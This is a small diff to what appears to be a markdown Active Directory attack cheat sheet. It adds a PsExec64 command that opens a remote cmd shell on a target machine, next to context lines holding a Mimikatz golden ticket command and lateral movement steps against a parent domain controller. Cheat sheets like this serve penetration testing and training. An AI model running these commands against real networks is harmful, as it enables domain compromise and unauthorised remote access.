@@ -477,6 +477,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CH
 ```
 dir \\<FQDN PARENT DC>\C$ 
 Enter-PSSession <COMPUTERNAME>
+.\PsExec64.exe \\<COMPUTERNAME> cmd
 ```
 
 ## Crossforest attacks
